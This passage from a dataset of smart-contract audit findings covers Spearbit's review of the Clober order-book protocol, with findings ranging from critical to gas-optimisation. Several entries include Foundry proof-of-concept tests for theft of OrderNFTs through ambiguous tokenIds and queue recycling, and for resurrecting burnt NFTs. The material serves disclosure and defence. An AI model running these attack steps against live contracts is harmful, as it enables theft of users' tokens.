MockQuoteToken quoteToken; MockBaseToken baseToken; MockOrderBook orderBook; OrderNFT orderToken; function setUp() public { quoteToken = new MockQuoteToken(); baseToken = new MockBaseToken(); } function cloberMarketSwapCallback( address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, bytes calldata data ) external payable { if (data.length != 0) { Return memory expectedReturn = abi.decode(data, (Return)); assertEq(tokenIn, expectedReturn.tokenIn, \"ERROR_TOKEN_IN\"); assertEq(tokenOut, expectedReturn.tokenOut, \"ERROR_TOKEN_OUT\"); assertEq(amountIn, expectedReturn.amountIn, \"ERROR_AMOUNT_IN\"); assertEq(amountOut, expectedReturn.amountOut, \"ERROR_AMOUNT_OUT\"); assertEq(msg.value, expectedReturn.refundBounty, \"ERROR_REFUND_BOUNTY\"); } IERC20(tokenIn).transfer(msg.sender, amountIn); } 8 function _createOrderBook(int24 makerFee, uint24 takerFee) private { orderToken = new OrderNFT(); orderBook = new MockOrderBook( address(orderToken), address(quoteToken), address(baseToken), 1, 10**4, makerFee, takerFee, address(this) ); orderToken.init(\"\", \"\", address(orderBook), address(this)); uint256 _quotePrecision = 10**quoteToken.decimals(); quoteToken.mint(address(this), 1000000000 * _quotePrecision); quoteToken.approve(address(orderBook), type(uint256).max); uint256 _basePrecision = 10**baseToken.decimals(); baseToken.mint(address(this), 1000000000 * _basePrecision); baseToken.approve(address(orderBook), type(uint256).max); } function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) { return (isBid ? 1 : 0) + (postOnly ? 2 : 0); } uint256 private constant _MAX_ORDER = 2**15; // 32768 uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768 function testExploit2() public { _createOrderBook(0, 0); address attacker = address(0x1337); address attacker2 = address(0x1338); address victim = address(0xbabe); // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 1e18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ,! ambiguous tokenIds CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); uint256 currentTokenId = orderToken.encodeId(orderKey); orderKey.orderIndex += _MAX_ORDER; uint256 futureTokenId = orderToken.encodeId(orderKey); // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id vm.startPrank(attacker); orderToken.approve(attacker2, futureTokenId); CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1); orderKeys[0] = orderKey; orderKeys[0].orderIndex = orderIndex; // restore original orderIndex 9 orderBook.cancel(attacker, orderKeys); vm.stopPrank(); // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0 uint256 victimOrderSize = 1e18; for(uint256 i = 0; i < _MAX_ORDER; i++) { orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: i < _MAX_ORDER - 1 ? attacker : victim, priceIndex: priceIndex, rawAmount: 0, baseAmount: victimOrderSize, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); } assertEq(orderToken.ownerOf(futureTokenId), victim); // Step 5. Attacker steals the NFT and can cancel to receive the tokens vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker, futureTokenId); vm.stopPrank(); assertEq(orderToken.ownerOf(futureTokenId), attacker); uint256 baseBalanceBefore = baseToken.balanceOf(attacker); vm.startPrank(attacker); orderKeys[0].orderIndex = orderIndex + _MAX_ORDER; orderBook.cancel(attacker, orderKeys); vm.stopPrank(); assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize); } }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "OrderNFT theft due to ambiguous tokenId encoding/decoding scheme",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The encodeId() uniquely encodes OrderKey to a uin256 number. However, decodeId() ambigu- ously can decode many tokenId's to the exact same OrderKey. This can be problematic due to the fact that contract uses tokenId's to store approvals. The ambiguity comes from converting uint8 value to bool isBid value here function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) { uint8 isBid; uint16 priceIndex; uint232 orderIndex; assembly { orderIndex := id priceIndex := shr(232, id) isBid := shr(248, id) } return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex: orderIndex}); ,! } (note that the attack is possible only for ASK limit orders) 11 Proof of Concept // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 10**18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds ,! CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); ,! uint256 tokenId = orderToken.encodeId(order_key); uint256 ambiguous_tokenId = tokenId + (1 << 255); // crafting ambiguous tokenId // Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other account ,! vm.startPrank(attacker); orderToken.approve(victim, tokenId); orderToken.approve(attacker2, ambiguous_tokenId); vm.stopPrank(); // Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it) vm.startPrank(victim); orderToken.transferFrom(attacker, victim, tokenId); vm.stopPrank(); // Step 5. Attacker steals the NFT vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker2, ambiguous_tokenId); vm.stopPrank();",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Missing owner check on from when transferring tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The OrderNFT.transferFrom/safeTransferFrom use the internal _transfer function. While they check approvals on msg.sender through _isApprovedOrOwner(msg.sender, tokenId), it is never checked that the specified from parameter is actually the owner of the NFT. An attacker can decrease other users' NFT balances, making them unable to cancel or claim their NFTs and locking users' funds. The attacker transfers their own NFT passing the victim as from by calling transfer- From(from=victim, to=attackerAccount, tokenId=attackerTokenId). This passes the _isApprovedOrOwner check, but reduces from's balance.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Wrong minimum net fee check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "A minimum net fee was introduced that all markets should comply by such that the protocol earns fees. The protocol fees are computed takerFee + makerFee and the market factory computes the wrong check. Fee pairs that should be accepted are currently not accepted, and even worse, fee pairs that should be rejected are currently accepted. Market creators can avoid collecting protocol fees this way.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Rounding up of taker fees of constituent orders may exceed collected fee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "If multiple orders are taken, the taker fee calculated is rounded up once, but that of each taken maker order could be rounded up as well, leading to more fees accounted for than actually taken. Example:  takerFee = 100011 (10.0011%)  2 maker orders of amounts 400000 and 377000  total amount = 400000 + 377000 = 777000  Taker fee taken = 777000 * 100011 / 1000000 = 77708.547 = 777709 Maker fees would be 13 377000 * 100011 / 1000000 = 37704.147 = 37705 400000 * 100011 / 1000000 = 40004.4 = 40005 which is 1 wei more than actually taken. Below is a foundry test to reproduce the problem, which can be inserted into Claim.t.sol: function testClaimFeesFailFromRounding() public { _createOrderBook(0, 100011); // 10.0011% taker fee // create 2 orders uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); uint256 orderIndex2 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); // take both orders _createTakeOrder(Constants.BID, 2 * Constants.RAW_AMOUNT); CloberOrderBook.OrderKey[] memory ids = new CloberOrderBook.OrderKey[](2); ids[0] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); ids[1] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex2 }); // perform claim orderBook.claim( address(this), ids ); // (uint128 quoteFeeBal, uint128 baseFeeBal) = orderBook.getFeeBalance(); // console.log(quoteFeeBal); // fee accounted = 20004 // console.log(baseFeeBal); // fee accounted = 0 // console.log(quoteToken.balanceOf(address(orderBook))); // actual fee collected = 20003 // try to claim fees, will revert vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); orderBook.collectFees(); }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Drain tokens condition due to reentrancy in collectFees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "collectFees function is not guarded by a re-entrancy guard. In case a transfer of at least one of the tokens in a trading pair allows to invoke arbitrary code (e.g. token implementing callbacks/hooks), it is possible for a malicious host to drain trading pools. The re-entrancy condition allows to transfer collected fees multiple times to both DAO and the host beyond the actual fee counter.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Group claim clashing condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Claim functionality is designed to support 3rd party operators to claim multiple orders on behalf of market's users to finalise the transactions, deliver assets and earn bounties. The code allows to iterate over a list of orders to execute _claim. function claim(address claimer, OrderKey[] calldata orderKeys) external nonReentrant revertOnDelegateCall { uint32 totalBounty = 0; for (uint256 i = 0; i < orderKeys.length; i++) { ... (uint256 claimedTokenAmount, uint256 minusFee, uint64 claimedRawAmount) = _claim( queue, mOrder, orderKey, claimer ); ... } } However, neither claim nor _claim functions in OrderBook support skipping already fulfilled orders. On the con- trary in case of a revert in _claim the whole transaction is reverted. function _claim(...) private returns (...) { ... require(mOrder.openOrderAmount > 0, Errors.OB_INVALID_CLAIM); ... } Such implementation does not support fully the initial idea of 3rd party operators claiming orders in batches. A transaction claiming multiple orders at once can easily clash with others and be reverted completely, effectively claiming nothing - just wasting gas. Clashing can happen for instance when two bots got overlapping lists of orders or when the owner of the order decides to claim or cancel his/her order manually while the bot is about to claim it as well. 15",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Order owner isn't zeroed after burning",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The order's owner is not zeroed out when the NFT is burnt. As a result, while the onBurn() method records the NFT to have been transferred to the zero address, ownerOf() still returns the current order's owner. This allows for unexpected behaviour, like being able to call approve() and safeTransferFrom() functions on non-existent tokens. A malicious actor could sell such resurrected NFTs on secondary exchanges for profit even though they have no monetary value. Such NFTs will revert on cancellation or claim attempts since openOrderAmount is zero. function testNFTMovementAfterBurn() public { _createOrderBook(0, 0); address attacker2 = address(0x1337); // Step 1: make 2 orders to avoid bal sub overflow when moving burnt NFT in step 3 uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); uint256 tokenId = orderToken.encodeId(orderKey); // Step 2: burn 1 NFT by cancelling one of the orders vm.startPrank(Constants.MAKER); orderBook.cancel( Constants.MAKER, _toArray(orderKey) ); // verify ownership is still maker assertEq(orderToken.ownerOf(tokenId), Constants.MAKER, \"NFT_OWNER\"); // Step 3: resurrect burnt token by calling safeTransferFrom orderToken.safeTransferFrom( Constants.MAKER, attacker2, tokenId ); // verify ownership is now attacker2 assertEq(orderToken.ownerOf(tokenId), attacker2, \"NFT_OWNER\"); }",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Lack of two-step role transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The contracts lack two-step role transfer. Both the ownership of the MarketFactory as well as the change of market's host are implemented as single-step functions. The basic validation whether the address is not a zero address for a market is performed, however the case when the address receiving the role is inaccessible is not covered properly. Taking into account the handOverHost can be invoked without any supervision, by anyone who created the market it is possible to make a typo unintentionally or intentionally if the attacker wants simply to brick fees collection as currently the host affects collectFees in OrderBook (described as a separate issue). The ownership transfer in theory should be less error-prone as it should be done by DAO with great care, however still two-step role transfer should be preferable.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Atomic fees delivery susceptible to funds lockout",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The collectFees function delivers the quoteToken part of fees as well as the baseToken part of fees atomically and simultaneously to both the DAO and the host. In case a single address is for instance blacklisted (e.g. via USDC blacklist feature) or a token in a pair happens to be malicious and configured the way transfer to one of the addresses reverts it is possible to block fees delivery. 17 function collectFees() external nonReentrant { // @audit delivers both tokens atomically require(msg.sender == _host(), Errors.ACCESS); if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } function _collectFees(IERC20 token, uint256 amount) internal { // @audit delivers to both wallets uint256 daoFeeAmount = (amount * _DAO_FEE) / _FEE_PRECISION; uint256 hostFeeAmount = amount - daoFeeAmount; _transferToken(token, _daoTreasury(), daoFeeAmount); _transferToken(token, _host(), hostFeeAmount); } There are multiple cases when such situation can happen for instance: a malicious host wants to block the function for DAO to prevent collecting at least guaranteed valuable quoteToken or a hacked DAO can swap treasury to some invalid address and renounce ownership to brick collectFees across multiple markets. Taking into account the current implementation in case it is not possible to transfer tokens it is necessary to swap the problematic address, however depending on the specific case it might be not trivial.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "DAO fees potentially unavailable due to overly strict access control",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The collectFees function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively deliver all collected fees, including the part of the fees belonging to the DAO. function collectFees() external nonReentrant { require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } This access control is too strict and can lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure in case access to the wallet is lost or is incorrectly transferred the fees for both the host and the DAO will be locked.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "OrderNFT ownership and market host transfers are done separately",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The market host is entitled to 80% of the fees collected, and is able to set the URI of the correspond- ing orderToken NFT. However, transferring the market host and the orderToken NFT is done separately. It is thus possible for a market host to transfer one but not the other.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OrderNFTs can be renamed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The OrderNFT contract's name and symbol can be changed at any time by the market host. Usually, these fields are immutable for ERC721 NFTs. There might be potential issues with off-chain indexers that cache only the original value. Furthermore, suddenly renaming tokens by a malicious market host could lead to web2 phishing attacks.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "DOSing _replaceStaleOrder() due to reverting on token transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "In the case of tokens with implemented hooks, a malicious order owner can revert on token received event thus cause a denial-of-service via _replaceStaleOrder(). The probability of such an attack is very low, because the order queue has to be full and it is unusual for tokens to implement hooks.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Total claimable bounties may exceed type(uint32).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Individual bounties are capped to type(uint32).max which is ~4.295 of a native token of 18 decimals (4.2949673e18 wei). It's possible (and likely in the case of Polygon network) for their sum to therefore exceed type(uint32).max.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Can fake market order in TakeOrder event",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Market orders in Orderbook.marketOrder set the 8-th bit of options. This options value is later used in _take's TakeOrder event. However, one can call Orderbook.limitOrder with this 8-th bit set and spoof a market order event.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_priceToIndex will revert if price is type(uint128).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Because price is type uint128, the increment will overflow first before it is casted to uint256 uint256 shiftedPrice = uint256(price + 1) << 64;",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "using block.chainid for create2 salt can be problematic if there's chain hardfork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Using block.chainid as salt for create2 can result in inconsistency if there is a chain split event(eg. eth2 merge). This will make 2 different chains that has different chainid(one with original chain id and one with random new value). Which will result in making one of the chains not able to interact with markets, nfts properly. Also, it will make things hard to do a fork testing which changes chainid for local environment.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use get64Unsafe() when updating claimable in take()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "get64Unsafe() can be used when fetching the stored claimable value since _getClaimableIndex() returns elementIndex < 4",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Check is zero is cheaper than check if the result is a concrete value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Checking if the result is zero vs. checking if the result is/isn't a concrete value should save 1 opcode.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function argument can be skipped",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The address caller parameter in the internal _cancel function can be replaced with msg.sender as effectively this is the value that is actually used when the function is invoked.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant flash loan balance cap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The requested flash loan amounts are checked against and capped up to the contract's token bal- ances, so the caller has to validate and handle the case where the tokens received are below the requested amounts. It would be better to optimize for the success case where there are sufficient tokens. Otherwise, let the function revert from failure to transfer the requested tokens instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Do direct assignment to totalBaseAmount and totalQuoteAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "While iterating through multiple claims, totalBaseAmount and totalQuoteAmount are reset and as- signed a value each iteration. Since they are only incremented in the referenced block (and are mutually exclusive cases), the assignment can be direct instead of doing an increment.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Redundant zero minusFee setter",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "minusFee defaults to zero, so the explicit setting of it is redundant.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Load _FEE_PRECISION into local variable before usage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Loading _FEE_PRECISION into a local variable slightly reduced bytecode size (0.017kB) and was found to be a tad more gas efficient.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Can cache value difference in SegmentedSegmentTree464.update",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The replaced - value expression in SegmentedSegmentTree464.pop is recomputed several times in each loop iteration.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unnecessary loop condition in pop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The loop variable l in SegmentedSegmentTree464.pop is an unsigned int, so the loop condition l >= 0 is always true. The reason why it still terminates is that the first layer only has group index 0 and 1, so the rightIndex.group - leftIndex.group < 4 condition is always true when the first layer is reached, and then it terminates with the break keyword.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Use same comparisons for children in heap",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The pop function compares one child with a strict inequality (<) and the other with less than or equals (<=). A heap doesn't guarantee order between the children and there are no duplicate nodes (wordIndexes).",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need for explicit assignment with default values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Explicitly assigning ZERO value (or any default value) costs gas, but is not needed.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Prefix increment is more efficient than postfix increment",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The prefix increment reduces bytecode size by a little, and is slightly more gas efficient.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Tree update can be avoided for fully filled orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "For fully filled orders, remainingAmount will be 0 (openOrderAmount == claimedRawAmount), so the tree update can be skipped since the new value is the same as the old value. Hence, the code block can be moved inside the if (remainingAmount > 0) code block.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Shift msg.value cap check for earlier revert",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The cap check on msg.value should be shifted up to the top of the function so that failed checks will revert earlier, saving gas in these cases.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Solmate's ReentrancyGuard is more efficient than OpenZeppelin's",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "Solmate's ReentrancyGuard provides the same functionality as OpenZeppelin's version, but is more efficient as it reduces the bytecode size by 0.11kB, which can be further reduced if its require statement is modified to revert with a custom error.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "r * r is more gas efficient than r ** 2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "It's more gas efficient to do r * r instead of r ** 2, saving on deployment cost.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Update childHeapIndex and shifter initial values to constants",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The initial values of childHeapIndex and shifter can be better hardcoded to avoid redundant operations.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Same value tree update falls under else case which will do redundant overflow check",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "In the case where value and replaced are equal, it currently will fall under the else case which has an addition overflow check that isn't required in this scenario. In fact, the tree does not need to be updated at all.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unchecked code blocks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The mentioned code blocks can be performed without native math overflow / underflow checks because they have been checked to be so, or the min / max range ensures it.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Unused Custom Error",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "error TreeQueryIndexOrder(); is defined but unused.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Markets with malicious tokens should not be interacted with",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The Clober protocol is permissionless and allows anyone to create an orderbook for any base token. These base tokens can be malicious and interacting with these markets can lead to loss of funds in several ways. For example, a token with custom code / a callback to an arbitrary address on transfer can use the pending ETH that the victim supplied to the router and trade it for another coin. The victim will lose their ETH and then be charged a second time using their WETH approval of the router.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Claim bounty of stale orders should be given to user instead of daoTreasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "When an unclaimed stale order is being replaced, the claimBounty is sent to the DAO treasury. However, since the user is the one executing the claim on behalf of the stale order owner, and is paying the gas for it, the claimBounty should be sent to him instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading comment on remainingRequestedRawAmount",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The comment says // always ceil, but remainingRequestedRawAmount is rounded down when the base / quote amounts are converted to the raw amount.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Potential DoS if quoteUnit and index to price functions are set to unreasonable values",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "There are some griefing and DoS (denial-of-service) attacks for some markets that are created with bad quoteUnit and pricing functions. 1. A market order uses _take to iterate over several price indices until the order is filled. An attacker can add a tiny amount of depth to many indices (prices), increasing the gas cost and in the worst case leading to out-of-gas transactions. 2. There can only be MAX_ORDER_SIZE (32768) different orders at a single price (index). Old orders are only replaced if the previous order at the index has been fully filled. A griefer or a market maker trying to block their competition can fill the entire order queue for a price. This requires 32768 * quoteUnit quote tokens.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rounding rationale could be better clarified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The rationale for rounding up / down was easier to follow if tied to the expendInput option instead.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename flashLoan() for better composability & ease of integration",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "For ease of 3rd party integration, consider renaming to flash(), as it would then have the same function sig as Uniswap V3, although the callback function would still be different.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unsupported tokens: tokens with more than 18 decimals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The orderbook does currently not support tokens with more than 18 decimals. However, having more than 18 decimals is very unusual.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "ArithmeticPriceBook and GeometricPriceBook contracts should be abstract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
        "body": "The ArithmeticPriceBook and GeometricPriceBook contracts don't have any external functions.",
        "labels": [
            "Spearbit",
            "Clober",
            "Severity: Informational"
        ]
    },
    {
        "title": "childRawIndex in OctopusHeap.pop is not a raw index",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf",
